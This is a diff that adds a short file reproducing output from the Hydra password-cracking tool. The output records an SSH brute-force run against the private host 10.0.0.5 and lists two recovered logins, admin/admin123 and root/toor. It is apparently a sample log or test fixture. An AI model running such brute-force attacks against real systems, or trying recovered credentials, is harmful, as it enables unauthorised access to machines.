@@ -1,0 +1,7 @@
+Hydra v9.4 (c) 2022 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2024-01-01 12:00:00
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
+[22][ssh] host: 10.0.0.5   login: admin   password: admin123
+[22][ssh] host: 10.0.0.5   login: root   password: toor
+1 of 1 target successfully completed, 2 valid passwords found
